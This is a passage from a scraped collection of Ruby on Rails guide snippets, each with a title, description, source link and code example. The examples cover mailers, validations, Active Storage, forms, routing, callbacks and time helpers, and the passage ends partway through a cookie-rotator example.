Mailer Previews\nDESCRIPTION: Example of implementing Action Mailer preview class for email testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass NotifierPreview < ActionMailer::Preview\n  def welcome\n    Notifier.welcome(User.first)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a New Rails Plugin Skeleton - Rails CLI - Bash\nDESCRIPTION: The command initializes a new gemified Rails plugin named 'yaffle' using the Rails command-line tool. It creates the basic directory structure and boilerplate files necessary to develop a distributable plugin with a dummy test app. No external dependencies are required beyond Rails and Bash, and it is run from a terminal.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails plugin new yaffle\n```\n\n----------------------------------------\n\nTITLE: Updated assert_select HTML Attribute Selector Usage\nDESCRIPTION: Demonstrates changes in assert_select attribute selector syntax requiring quoted values for non-alphanumeric characters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# before\na[href=/]\na[href$=/]\n\n# now\na[href=\"/\"]\na[href$=\"/\"]\n```\n\n----------------------------------------\n\nTITLE: Filtering Errors by Options in Rails\nDESCRIPTION: This snippet shows how to filter validation errors by specific options. It demonstrates filtering name errors that are too short with a minimum length of 3 characters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\nirb> person.valid?\n=> false\n\nirb> person.errors.where(:name, :too_short, minimum: 3)\n=> [ ... ] # all name errors being too short and minimum is 3\n```\n\n----------------------------------------\n\nTITLE: Switching to Older Rails Version Branch\nDESCRIPTION: This bash snippet demonstrates how to set up and switch to a local tracking branch for an older version of Rails, specifically the 7-0-stable branch.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_46\n\nLANGUAGE: bash\nCODE:\n```\n$ git branch --track 7-0-stable rails/7-0-stable\n$ git checkout 7-0-stable\n```\n\n----------------------------------------\n\nTITLE: Rendering Spacer Templates in Rails\nDESCRIPTION: This example demonstrates how to specify a spacer template to be rendered between each instance of the main partial using the `:spacer_template` option. Rails will render the `_product_ruler.html.erb` partial between each `_product.html.erb` partial when rendering the `@products` collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_22\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: @products, spacer_template: \"product_ruler\" %>\n```\n\n----------------------------------------\n\nTITLE: Documenting image_tag Output with Asset Pipeline Example - Ruby\nDESCRIPTION: Documents the usage and expected HTML output of the Rails image_tag helper, with consideration for the Asset Pipeline's effect on the output path. This example helps distinguish between framework-level behavior and isolated method return values. Requires the ActionView::Helpers::AssetTagHelper#image_tag method and assumes asset pipeline integration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\n# image_tag(\"icon.png\")\n#   # => <img src=\"/assets/icon.png\" />\n```\n\n----------------------------------------\n\nTITLE: Touching a User object in Rails console\nDESCRIPTION: Demonstrates touching a `User` object in the Rails console and observing the `after_touch` callback execution. The `user.touch` command triggers the callback, which logs the message 'You have touched an object'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_22\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.create(name: \"Kuldeep\")\n=> #<User id: 1, name: \"Kuldeep\", created_at: \"2013-11-25 12:17:49\", updated_at: \"2013-11-25 12:17:49\">\n\nirb> user.touch\nYou have touched an object\n=> true\n```\n\n----------------------------------------\n\nTITLE: Indent String with Empty Lines\nDESCRIPTION: This snippet demonstrates indenting lines in a string, including empty lines, by setting the `indent_empty_lines` option to true.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\n\"foo\\n\\nbar\".indent(2)            # => \"  foo\\n\\n  bar\"\n\"foo\\n\\nbar\".indent(2, nil, true) # => \"  foo\\n  \\n  bar\"\n```\n\n----------------------------------------\n\nTITLE: Action Cable Parent Channel Setup in Ruby\nDESCRIPTION: This code shows the default parent `ApplicationCable::Channel` class, which inherits from `ActionCable::Channel::Base`. This class encapsulates shared logic between your channels.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/application_cable/channel.rb\nmodule ApplicationCable\n  class Channel < ActionCable::Channel::Base\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Custom XML Parser Backend for XMLmini in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to swap the XML parser used by Active Support's XMLmini. Instead of the default REXML implementation, you can specify faster alternatives like LibXML or Nokogiri, provided you have the appropriate gems installed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nXmlMini.backend = 'LibXML'\n```\n\n----------------------------------------\n\nTITLE: Finding Book with Composite Primary Key\nDESCRIPTION: This snippet demonstrates how to find a Book model object with a composite primary key in Ruby. This is used to update the book with a form.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n@book = Book.find([2, 25])\n# => #<Book id: 25, title: \"Some book\", author_id: 2>\n```\n\n----------------------------------------\n\nTITLE: Incorrect Middleware Reference Example for Rails 4.0\nDESCRIPTION: Example of code that will raise an exception in Rails 4.0 as the BestStandardsSupport middleware has been removed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_98\n\nLANGUAGE: ruby\nCODE:\n```\n# Raise exception\nconfig.middleware.insert_before(Rack::Lock, ActionDispatch::BestStandardsSupport)\n```\n\n----------------------------------------\n\nTITLE: Creating Rails Application from Local Repository\nDESCRIPTION: Command for creating a new Rails application using a local checkout of the Rails repository with the --dev flag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ ruby /path/to/rails/railties/bin/rails new myapp --dev\n```\n\n----------------------------------------\n\nTITLE: Running EXPLAIN ANALYZE with Buffers on Queries - ActiveRecord Query - Ruby\nDESCRIPTION: Queries a companies table using ActiveRecord, then invokes explain with analyze and buffers options to output a detailed execution plan including buffer usage. Requires ActiveRecord, PostgreSQL backend, and a companies table; useful for query optimization and diagnostics. Inputs are IDs of companies; output is a textual EXPLAIN report.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nCompany.where(id: owning_companies_ids).explain(:analyze, :buffers)\\n#=> EXPLAIN (ANALYZE, BUFFERS) SELECT \\\"companies\\\".* FROM \\\"companies\\\"\\n# ...\\n# Seq Scan on companies  (cost=0.00..2.21 rows=3 width=64)\\n# ...\n```\n\n----------------------------------------\n\nTITLE: Checking Yarn Version in Bash\nDESCRIPTION: Command to verify the installation of Yarn by checking its version in the terminal.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ yarn --version\n```\n\n----------------------------------------\n\nTITLE: Output Demonstrating Generator Fallback Mechanism using Bash\nDESCRIPTION: Illustrates the result of running `bin/rails generate scaffold Comment body:text` with the fallback configured. The output shows `invoke my_test_unit` being called, the custom generator message 'Doing different stuff...' for the model test, but other `test_unit` generators (like controller tests) are still invoked via the fallback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold Comment body:text\n      invoke  active_record\n      create    db/migrate/20230518000000_create_comments.rb\n      create    app/models/comment.rb\n      invoke    my_test_unit\n    Doing different stuff...\n      invoke  resource_route\n       route    resources :comments\n      invoke  scaffold_controller\n      create    app/controllers/comments_controller.rb\n      invoke    erb\n      create      app/views/comments\n      create      app/views/comments/index.html.erb\n      create      app/views/comments/edit.html.erb\n      create      app/views/comments/show.html.erb\n      create      app/views/comments/new.html.erb\n      create      app/views/comments/_form.html.erb\n      create      app/views/comments/_comment.html.erb\n      invoke    resource_route\n      invoke    my_test_unit\n      create      test/controllers/comments_controller_test.rb\n      create      test/system/comments_test.rb\n      invoke    helper\n      create      app/helpers/comments_helper.rb\n      invoke      my_test_unit\n      invoke    jbuilder\n      create      app/views/comments/index.json.jbuilder\n      create      app/views/comments/show.json.jbuilder\n```\n\n----------------------------------------\n\nTITLE: Broadcasting to Web Notifications Channel\nDESCRIPTION: This Ruby code demonstrates how to broadcast a message to a specific user's `WebNotificationsChannel`. It calls `WebNotificationsChannel.broadcast_to` with the `current_user` and a hash containing the notification's title and body. This sends the specified data to the user's channel.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_25\n\nLANGUAGE: Ruby\nCODE:\n```\n# Somewhere in your app this is called, perhaps from a NewCommentJob\nWebNotificationsChannel.broadcast_to(\n  current_user,\n  title: \"New things!\",\n  body: \"All the news fit to print\"\n)\n```\n\n----------------------------------------\n\nTITLE: Setting Up Active Storage Attachment Fixtures in YAML\nDESCRIPTION: Defines Active Storage attachment fixtures, establishing the relationship between a user (david) and their avatar attachment, which links to a specific blob.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_78\n\nLANGUAGE: yaml\nCODE:\n```\ndavid_avatar:\n  name: avatar\n  record: david (User)\n  blob: david_avatar_blob\n```\n\n----------------------------------------\n\nTITLE: Permitting the Rich Text Attribute in the Controller\nDESCRIPTION: This Ruby code permits the `content` attribute as a parameter in the `ArticlesController`, allowing updates from the Trix editor to be accepted.  The example uses `params.expect` which may not be the most robust way to permit parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass ArticlesController < ApplicationController\n  def create\n    article = Article.create! params.expect(article: [:title, :content])\n    redirect_to article\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting File Sizes with number_to_human_size in Ruby\nDESCRIPTION: Shows how to use the number_to_human_size helper to format byte sizes into more understandable representations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nnumber_to_human_size(1234)    # => 1.21 KB\nnumber_to_human_size(1234567) # => 1.18 MB\n```\n\n----------------------------------------\n\nTITLE: Setting Up Bundler and Bootsnap in config/boot.rb (Ruby)\nDESCRIPTION: This file (`config/boot.rb`) configures the application's environment for gem management and boot speed optimization. It sets the `BUNDLE_GEMFILE` environment variable to the application's Gemfile path, requires `bundler/setup` to configure the load path for gem dependencies defined in the Gemfile, and requires `bootsnap/setup` to cache expensive operations and speed up application boot time.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nENV[\"BUNDLE_GEMFILE\"] ||= File.expand_path(\"../Gemfile\", __dir__)\n\nrequire \"bundler/setup\" # Set up gems listed in the Gemfile.\nrequire \"bootsnap/setup\" # Speed up boot time by caching expensive operations.\n```\n\n----------------------------------------\n\nTITLE: Listing Test Directory Contents (Bash)\nDESCRIPTION: This bash command lists the contents of the `test` directory in a Rails application, showing the structure of the testing environment. This command provides an overview of the different types of tests and supporting files within the directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ ls -F test\napplication_system_test_case.rb  controllers/                     helpers/                         mailers/                         system/                          fixtures/                        integration/                     models/                          test_helper.rb\n```\n\n----------------------------------------\n\nTITLE: Getting previous/next month with prev_month/next_month in Rails\nDESCRIPTION: The `prev_month` and `next_month` methods are Rails extensions to the Time class that return a Time object representing the previous or next month respectively, with the same day of the month. If the day doesn't exist in the target month, the last day of that month is returned.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_169\n\nLANGUAGE: ruby\nCODE:\n```\nt = Time.new(2010, 5, 8) # => 2010-05-08 00:00:00 +0900\nt.prev_month             # => 2010-04-08 00:00:00 +0900\nt.next_month             # => 2010-06-08 00:00:00 +0900\n```\n\nLANGUAGE: ruby\nCODE:\n```\nTime.new(2000, 5, 31).prev_month # => 2000-04-30 00:00:00 +0900\nTime.new(2000, 3, 31).prev_month # => 2000-02-29 00:00:00 +0900\nTime.new(2000, 5, 31).next_month # => 2000-06-30 00:00:00 +0900\nTime.new(2000, 1, 31).next_month # => 2000-02-29 00:00:00 +0900\n```\n\n----------------------------------------\n\nTITLE: Optimistic Locking Example (Ruby)\nDESCRIPTION: This snippet illustrates optimistic locking using the `lock_version` column. If another process changes the record, an `ActiveRecord::StaleObjectError` will be raised.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_131\n\nLANGUAGE: ruby\nCODE:\n```\nc1 = Customer.find(1)\nc2 = Customer.find(1)\n\nc1.first_name = \"Sandra\"\nc1.save\n\nc2.first_name = \"Michael\"\nc2.save # Raises an ActiveRecord::StaleObjectError\n```\n\n----------------------------------------\n\nTITLE: SQL Query after Regrouping (SQL)\nDESCRIPTION: This SQL query shows the result of using the `regroup` method. The results are now grouped by `id`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_126\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books GROUP BY id\n```\n\n----------------------------------------\n\nTITLE: form_with with Namespaced Routes\nDESCRIPTION: This snippet shows how to use form_with with namespaced routes. Assumes the application has an admin namespace.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nform_with model: [:admin, @article]\n```\n\n----------------------------------------\n\nTITLE: Jbuilder Gemfile Entry (Ruby)\nDESCRIPTION: This shows the entry to add to your Gemfile if the Jbuilder gem isn't already included in your Rails project. It is required for creating JSON responses using Jbuilder templates.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_5\n\nLANGUAGE: Ruby\nCODE:\n```\ngem \"jbuilder\"\n```\n\n----------------------------------------\n\nTITLE: Preventing Instance Method Generation with cattr_accessor\nDESCRIPTION: This Ruby code demonstrates how to prevent the generation of instance reader and writer methods for class attributes defined using `cattr_accessor`.  By setting `:instance_reader`, `:instance_writer`, or `:instance_accessor` to `false`, the corresponding instance methods are not created.  This can be useful to prevent mass-assignment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nmodule A\n  class B\n    # No first_name instance reader is generated.\n    cattr_accessor :first_name, instance_reader: false\n    # No last_name= instance writer is generated.\n    cattr_accessor :last_name, instance_writer: false\n    # No surname instance reader or surname= writer is generated.\n    cattr_accessor :surname, instance_accessor: false\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Runner Executor Wrapper\nDESCRIPTION: Example showing how Rails runner automatically wraps scripts with Rails Executor for exception handling.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.executor.wrap do\n  # executes code inside lib/long_running_scripts.rb\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Azure Storage Blob Gem to Gemfile\nDESCRIPTION: Ruby code to add the azure-storage-blob gem to the Rails application's Gemfile.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"azure-storage-blob\", \"~> 2.0\", require: false\n```\n\n----------------------------------------\n\nTITLE: Creating a New Rails Application Without Asset Pipeline\nDESCRIPTION: A bash command to create a new Rails application with the option to skip the asset pipeline setup. This prevents Propshaft from being included in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new app_name --skip-asset-pipeline\n```\n\n----------------------------------------\n\nTITLE: Basic Routes Configuration\nDESCRIPTION: Default routes configuration file created for a Rails engine\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.draw do\nend\n```\n\n----------------------------------------\n\nTITLE: Truncate String with Regex Separator\nDESCRIPTION: This snippet demonstrates truncating a string using a regular expression as a separator. This allows for more flexible break points. The truncation accounts for the length of the omission string, preventing cutting words.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate(18, separator: /\\s/)\n# => \"Oh dear! Oh...\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving CSRF Token in JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to retrieve the CSRF token from the meta tags in the document head. It uses modern optional chaining to safely access the content attribute of the csrf-token meta tag for use in Ajax requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.head.querySelector(\"meta[name=csrf-token]\")?.content\n```\n\n----------------------------------------\n\nTITLE: Rails Application config.ru File\nDESCRIPTION: The standard Rails config.ru file used by Rack-based servers to start the application. It requires the environment configuration and runs the Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# This file is used by Rack-based servers to start the application.\n\nrequire_relative \"config/environment\"\n\nrun Rails.application\nRails.application.load_server\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of last with composite primary key\nDESCRIPTION: SQL query for retrieving the last record with a composite primary key (`store_id`, `id`). The ordering is done based on these columns in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_29\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.store_id DESC, customers.id DESC LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Running Tests for a Specific Directory in Bash (Active Storage)\nDESCRIPTION: This command executes tests located only within a specific subdirectory (`models`) inside a component's test directory (`activestorage/test`). Useful for focusing on a particular area within a component.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ cd activestorage\n$ bin/test models\n```\n\n----------------------------------------\n\nTITLE: Creating Paths with Object Array - Ruby/ERB\nDESCRIPTION: This snippet shows a shorter way to generate a path using an array of objects directly in `link_to`.  Rails will automatically resolve the path based on the object types.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_23\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to 'Ad details', [@magazine, @ad] %>\n```\n\n----------------------------------------\n\nTITLE: Touching a Book object with belongs_to :library in Rails console\nDESCRIPTION: Demonstrates how touching a `Book` object triggers the `after_touch` callbacks on both the `Book` and its associated `Library` due to the `touch: true` option in the `belongs_to` association. The console output shows the messages logged by both callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_24\n\nLANGUAGE: irb\nCODE:\n```\nirb> book = Book.last\n=> #<Book id: 1, library_id: 1, created_at: \"2013-11-25 17:04:22\", updated_at: \"2013-11-25 17:05:05\">\n\nirb> book.touch # triggers book.library.touch\nA Book was touched\nBook/Library was touched\n=> true\n```\n\n----------------------------------------\n\nTITLE: Person model in Ruby\nDESCRIPTION: This Ruby code initializes a Person object with a birth_date.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n@person = Person.new(birth_date: Date.new(1995, 12, 21))\n```\n\n----------------------------------------\n\nTITLE: Generating Namespaced Models in Ruby on Rails\nDESCRIPTION: This bash command demonstrates how to generate a namespaced model 'Book::Order' using the Rails generate command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model Book::Order\n      invoke  active_record\n      create    db/migrate/20240306194227_create_book_orders.rb\n      create    app/models/book/order.rb\n      create    app/models/book.rb\n      invoke    test_unit\n      create      test/models/book/order_test.rb\n      create      test/fixtures/book/orders.yml\n```\n\n----------------------------------------\n\nTITLE: Getting previous/next year with prev_year/next_year in Rails\nDESCRIPTION: The `prev_year` and `next_year` methods are Rails extensions to the Time class that return a Time object representing the previous or next year respectively, with the same day and month. If the date is February 29th and the target year is not a leap year, the resulting date is February 28th.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_170\n\nLANGUAGE: ruby\nCODE:\n```\nt = Time.new(2010, 5, 8) # => 2010-05-08 00:00:00 +0900\nt.prev_year              # => 2009-05-08 00:00:00 +0900\nt.next_year              # => 2011-05-08 00:00:00 +0900\n```\n\nLANGUAGE: ruby\nCODE:\n```\nt = Time.new(2000, 2, 29) # => 2000-02-29 00:00:00 +0900\nt.prev_year               # => 1999-02-28 00:00:00 +0900\nt.next_year               # => 2001-02-28 00:00:00 +0900\n```\n\n----------------------------------------\n\nTITLE: Database Migration Scoping\nDESCRIPTION: Shows how to run migrations for a specific scope using rake command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nrake db:migrate SCOPE=blog\n```\n\n----------------------------------------\n\nTITLE: Using ActiveRecord Pluck Method\nDESCRIPTION: Demonstrates the use of pluck method to retrieve specific column values directly from the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nClient.where(:active => true).pluck(:id)\n# SELECT id from clients where active = 1\n```\n\n----------------------------------------\n\nTITLE: Running System Tests with Remote Browser (Bash)\nDESCRIPTION: This bash command shows how to run system tests while specifying the remote Selenium URL via an environment variable. This is often used when running tests against a remote browser such as Headless Chrome in Docker.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_64\n\nLANGUAGE: bash\nCODE:\n```\n$ SELENIUM_REMOTE_URL=http://localhost:4444/wd/hub bin/rails test:system\n```\n\n----------------------------------------\n\nTITLE: Configuring Google Cloud Storage Service\nDESCRIPTION: YAML configuration for setting up Google Cloud Storage as an Active Storage service.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\ngoogle:\n  service: GCS\n  credentials: <%= Rails.root.join(\"path/to/keyfile.json\") %>\n  project: \"\"\n  bucket: your_own_bucket-<%= Rails.env %>\n```\n\n----------------------------------------\n\nTITLE: Generating Guides in Another Language - Bash\nDESCRIPTION: Shows how to generate Rails guides in a specified language (e.g., Spanish) using the GUIDES_LANGUAGE environment variable. Requires guide files arranged in source subdirectories. Input is a language code; output is guides in that language.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake guides:generate GUIDES_LANGUAGE=es\n```\n\n----------------------------------------\n\nTITLE: Basic HomeController with Flash Message\nDESCRIPTION: A simple HomeController implementation with an index action that sets a flash notice message in English, which will later be internationalized.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/home_controller.rb\nclass HomeController < ApplicationController\n  def index\n    flash[:notice] = \"Hello Flash\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Basic HTTP Authentication in Rails Controller - Legacy Implementation\nDESCRIPTION: Shows the traditional way of implementing HTTP basic authentication in a Rails controller using before_filter and authenticate_or_request_with_http_basic method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  USER_NAME, PASSWORD = \"dhh\", \"secret\"\n\n  before_filter :authenticate, :except => [ :index ]\n\n  def index\n    render :text => \"Everyone can see me!\"\n  end\n\n  def edit\n    render :text => \"I'm only accessible if you know the password\"\n  end\n\n  private\n    def authenticate\n      authenticate_or_request_with_http_basic do |user_name, password|\n        user_name == USER_NAME && password == PASSWORD\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Checking Bun Version in Bash\nDESCRIPTION: Command to verify the installation of Bun by checking its version in the terminal.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ bun --version\n```\n\n----------------------------------------\n\nTITLE: Defining class methods on Action Mailers for synchronous execution\nDESCRIPTION: Example showing how to define class methods on a mailer class for synchronous execution in Rails 4.2, which is useful when you need to perform operations that don't directly send emails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\nclass Notifier < ActionMailer::Base\n  def self.broadcast_notifications(users, ...)\n    users.each { |user| Notifier.notify(user, ...) }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Default Model Test Stub (Ruby)\nDESCRIPTION: This is the default test stub generated when creating a model. It includes requiring the 'test_helper' and defines a basic test case class inheriting from 'ActiveSupport::TestCase'. This is the foundation for writing model tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_2\n\nLANGUAGE: Ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ArticleTest < ActiveSupport::TestCase\n  # test \"the truth\" do\n  #   assert true\n  # end\nend\n```\n\n----------------------------------------\n\nTITLE: Common Form Helpers in Rails Forms\nDESCRIPTION: This snippet shows examples of other common form helpers, including textarea, hidden field, number field, range field, search field, and color field in Rails forms.  These create various input types, often with associated parameters for controlling behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_13\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.textarea :message, size: \"70x5\" %>\n<%= form.hidden_field :parent_id, value: \"foo\" %>\n<%= form.number_field :price, in: 1.0..20.0, step: 0.5 %>\n<%= form.range_field :discount, in: 1..100 %>\n<%= form.search_field :name %>\n<%= form.color_field :favorite_color %>\n```\n\n----------------------------------------\n\nTITLE: Installing Engine Migrations from Custom Path (Bash)\nDESCRIPTION: Copies migrations from engines, specifying a non-standard source directory within the engine using the `MIGRATIONS_PATH` environment variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_32\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails railties:install:migrations MIGRATIONS_PATH=db_blourgh\n```\n\n----------------------------------------\n\nTITLE: Length Validation with Infinite Ranges in Ruby\nDESCRIPTION: Shows how to use infinite ranges with LengthValidator's :in/:within options for model validations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nvalidates_length_of :first_name, in: ..30\n```\n\n----------------------------------------\n\nTITLE: DateTime Modification Support\nDESCRIPTION: Enhancement to DateTime#change method to support microsecond and nanosecond precision.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nDateTime#change\n```\n\n----------------------------------------\n\nTITLE: Form for Model with Composite Primary Key\nDESCRIPTION: This snippet demonstrates how to create a form for a model with a composite primary key. It uses `form_with` with the `@book` model object. The generated HTML form's `action` attribute contains the composite key values delimited by an underscore.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_13\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @book do |form| %>\n  <%= form.text_field :title %>\n  <%= form.submit %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Checkbox Params Hash Example - Ruby\nDESCRIPTION: This snippet shows an example of how the `params` hash would look if the user only checked the 'Biography' checkbox in the previous example. The `biography` key has a value of '1', while the other checkboxes have a value of '0'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  \"biography\" => \"1\",\n  \"romance\" => \"0\",\n  \"mystery\" => \"0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Cookie Rotator for Digest Class Change - Ruby\nDESCRIPTION: Implements a cookie rotator to maintain compatibility with cookies created using the old SHA1 digest class when upgrading to Rails 7.0, which uses SHA256 by default for key generation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/cookie_rotator.rb\nRails.application.config.after_initialize do\n  Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|\n    authenticated_encrypted_cookie_salt = Rails.application.config.action_dispatch.authenticated_encrypted_cookie_salt\n    signed_cookie_salt = 